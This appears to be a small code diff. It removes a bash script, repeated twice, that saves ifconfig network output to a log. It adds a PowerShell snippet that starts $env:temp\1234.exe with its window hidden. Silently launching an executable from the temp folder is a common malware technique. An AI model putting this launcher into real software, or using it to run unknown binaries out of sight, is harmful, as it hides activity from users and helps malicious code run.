@@ -1,23 +1,9 @@
-#!/bin/bash
-
-if [ ! -d /tmp/testDir ]; then
-mkdir /tmp/testDir
-fi
-
-cd /tmp/testDir
-touch test.sh
-ifconfig > ifconfig.log
-
-
-
-#!/bin/bash
-
-if [ ! -d /tmp/testDir ]; then
-mkdir /tmp/testDir
-fi
-
-cd /tmp/testDir
-touch test.sh
-ifconfig > ifconfig.log
-
-
+$filePath = "$env:temp\1234.exe"
+if (Test-Path -Path $filePath) {
+  $psi = New-Object System.Diagnostics.ProcessStartInfo
+  $psi.FileName = $filePath
+  $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+  [System.Diagnostics.Process]::Start($psi)
+} else {
+  Write-Host "File not found: $filePath"
+}
